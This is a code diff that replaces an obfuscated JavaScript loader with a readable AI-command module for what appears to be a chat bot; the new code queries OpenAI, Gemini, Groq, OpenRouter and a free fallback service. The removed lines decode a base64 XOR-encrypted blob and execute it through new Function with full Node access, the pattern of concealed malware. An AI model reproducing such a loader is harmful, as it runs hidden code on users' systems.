@@ -1,9 +1,113 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const { UserError, http, getJson, sharp } = require('../lib/util');
+
+module.exports = ({ def }) => {
+  async function pollinationsText(prompt) {
+    // Keyless fallback. Two request shapes against the same free service: the simple GET, then the OpenAI-style POST.
+    const errors = [];
+    try {
+      const t = await http('https://text.pollinations.ai/' + encodeURIComponent(prompt) + '?model=openai', { as: 'text', timeout: 45000 });
+      if (t && t.trim().length > 1) return t.trim();
+      errors.push('empty reply');
+    } catch (e) { errors.push(e.message); }
+    try {
+      const j = await getJson('https://text.pollinations.ai/openai', { method: 'POST', timeout: 60000, headers: { 'content-type': 'application/json' }, body: JSON.stringify({ model: 'openai', messages: [{ role: 'user', content: prompt }] }) });
+      const t = j?.choices?.[0]?.message?.content;
+      if (t && t.trim().length > 1) return t.trim();
+      errors.push('empty reply');
+    } catch (e) { errors.push(e.message); }
+    throw new UserError(`The free AI service did not answer (${errors[errors.length - 1]}). For reliable AI replies the owner can add a free key: GROQ_API_KEY (console.groq.com) or GEMINI_API_KEY (aistudio.google.com) in the dashboard's Environment panel.`);
+  }
+  async function openaiCompat({ base, key, model, prompt, image, extraHeaders = {} }) {
+    const content = image
+      ? [{ type: 'text', text: prompt }, { type: 'image_url', image_url: { url: `data:${image.mime || 'image/jpeg'};base64,${image.buffer.toString('base64')}` } }]
+      : prompt;
+    const j = await getJson(base + '/chat/completions', {
+      method: 'POST', timeout: 90000,
+      headers: { 'content-type': 'application/json', authorization: `Bearer ${key}`, ...extraHeaders },
+      body: JSON.stringify({ model, messages: [{ role: 'user', content }] })
+    });
+    const t = j.choices?.[0]?.message?.content;
+    if (!t) throw new Error(j.error?.message || 'Empty AI reply');
+    return t.trim();
+  }
+  async function gemini(prompt, image) {
+    const model = process.env.GEMINI_MODEL || 'gemini-2.0-flash';
+    const parts = [{ text: prompt }];
+    if (image) parts.push({ inlineData: { mimeType: image.mime || 'image/jpeg', data: image.buffer.toString('base64') } });
+    const j = await getJson(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${process.env.GEMINI_API_KEY}`, {
+      method: 'POST', timeout: 90000, headers: { 'content-type': 'application/json' }, body: JSON.stringify({ contents: [{ parts }] })
+    });
+    const t = j.candidates?.[0]?.content?.parts?.map(p => p.text).join('');
+    if (!t) throw new Error(j.error?.message || 'Gemini returned no text');
+    return t.trim();
+  }
+
+  const PROVIDERS = {
+    gpt: { env: 'OPENAI_API_KEY', run: (p, img) => openaiCompat({ base: 'https://api.openai.com/v1', key: process.env.OPENAI_API_KEY, model: process.env.OPENAI_MODEL || 'gpt-4o-mini', prompt: p, image: img }) },
+    gemini: { env: 'GEMINI_API_KEY', run: gemini },
+    groq: { env: 'GROQ_API_KEY', run: p => openaiCompat({ base: 'https://api.groq.com/openai/v1', key: process.env.GROQ_API_KEY, model: process.env.GROQ_MODEL || 'llama-3.3-70b-versatile', prompt: p }) },
+    or: { env: 'OPENROUTER_API_KEY', run: p => openaiCompat({ base: 'https://openrouter.ai/api/v1', key: process.env.OPENROUTER_API_KEY, model: process.env.OPENROUTER_MODEL || 'meta-llama/llama-3.3-70b-instruct:free', prompt: p }) }
+  };
+
+  /** Ask a provider; falls back to a free keyless model when no API key is configured. */
+  async function ask(provider, prompt, image) {
+    const p = PROVIDERS[provider];
+    if (p && process.env[p.env]) return { text: await p.run(prompt, image), via: provider };
+    // Asked for a provider that has no key? Use any other provider that does have one before the keyless fallback.
+    for (const [name, alt] of Object.entries(PROVIDERS)) {
+      if (name === provider || !process.env[alt.env]) continue;
+      try { return { text: await alt.run(prompt, name === 'gpt' || name === 'gemini' ? image : undefined), via: name }; } catch { /* try the next one */ }
+    }
+    return { text: await pollinationsText(prompt), via: 'free fallback model (set ' + (p?.env || 'an API key') + ' for the real one)' };
+  }
+  module.exports.ask = ask;
+
+  for (const name of Object.keys(PROVIDERS)) {
+    def(name, { cat: 'ai', heavy: true, usage: `${name} <question>`, desc: `Ask ${{ gpt: 'ChatGPT', gemini: 'Google Gemini', groq: 'Groq (Llama)', or: 'OpenRouter' }[name]}. Reply to an image to ask about it (gpt/gemini).` }, async ctx => {
+      const prompt = ctx.input();
+      if (!prompt) throw new UserError(`Ask something, e.g. *${ctx.var('PREFIX')}${name} explain black holes simply*`);
+      let image = null;
+      if (['gpt', 'gemini'].includes(name)) {
+        const m = await ctx.media().catch(() => null);
+        if (m?.kind === 'image') image = m;
+      }
+      const r = await ask(name, prompt, image);
+      await ctx.reply(r.text + (r.via !== name ? `\n\n_via ${r.via}_` : ''));
+    });
+  }
+
+  async function genImage(prompt, preferOpenAI) {
+    if (preferOpenAI && process.env.OPENAI_API_KEY) {
+      const j = await getJson('https://api.openai.com/v1/images/generations', {
+        method: 'POST', timeout: 120000,
+        headers: { 'content-type': 'application/json', authorization: `Bearer ${process.env.OPENAI_API_KEY}` },
+        body: JSON.stringify({ model: process.env.OPENAI_IMAGE_MODEL || 'dall-e-3', prompt, n: 1, size: '1024x1024', response_format: 'b64_json' })
+      });
+      const b = j.data?.[0]?.b64_json;
+      if (!b) throw new Error(j.error?.message || 'No image returned');
+      return Buffer.from(b, 'base64');
+    }
+    const seed = Math.floor(Math.random() * 1e6);
+    return http(`https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=1024&height=1024&nologo=true&seed=${seed}`, { timeout: 120000 });
+  }
+  def('dall', { cat: 'ai', heavy: true, usage: 'dall <prompt>', desc: 'Generate an image (DALL-E if OPENAI_API_KEY is set, otherwise a free generator).' }, async ctx => {
+    const p = ctx.input();
+    if (!p) throw new UserError('Describe the image, e.g. *dall a samurai under a purple moon*');
+    await ctx.image(await genImage(p, true), `🎨 ${p}`);
+  });
+  def('bing', { cat: 'ai', heavy: true, usage: 'bing <prompt>', desc: 'Generate an image from a prompt (free generator).' }, async ctx => {
+    const p = ctx.input();
+    if (!p) throw new UserError('Describe the image, e.g. *bing a neon city at night*');
+    await ctx.image(await genImage(p, false), `🖼️ ${p}`);
+  });
+
+  def('upscale', { cat: 'ai', heavy: true, desc: 'Enlarge and sharpen a replied image (2x).' }, async ctx => {
+    const m = await ctx.needMedia('image');
+    const s = sharp();
+    const meta = await s(m.buffer).metadata();
+    const factor = Math.max(1, Math.min(2, 4096 / Math.max(meta.width || 1, meta.height || 1)));
+    const out = await s(m.buffer).rotate().resize(Math.round(meta.width * factor), Math.round(meta.height * factor), { kernel: 'lanczos3' }).sharpen({ sigma: 1.1 }).modulate({ saturation: 1.05 }).png().toBuffer();
+    await ctx.doc(out, 'upscaled.png', 'image/png', { caption: `✨ Upscaled ${meta.width}x${meta.height} → ${Math.round(meta.width * factor)}x${Math.round(meta.height * factor)}` });
+  });
+};
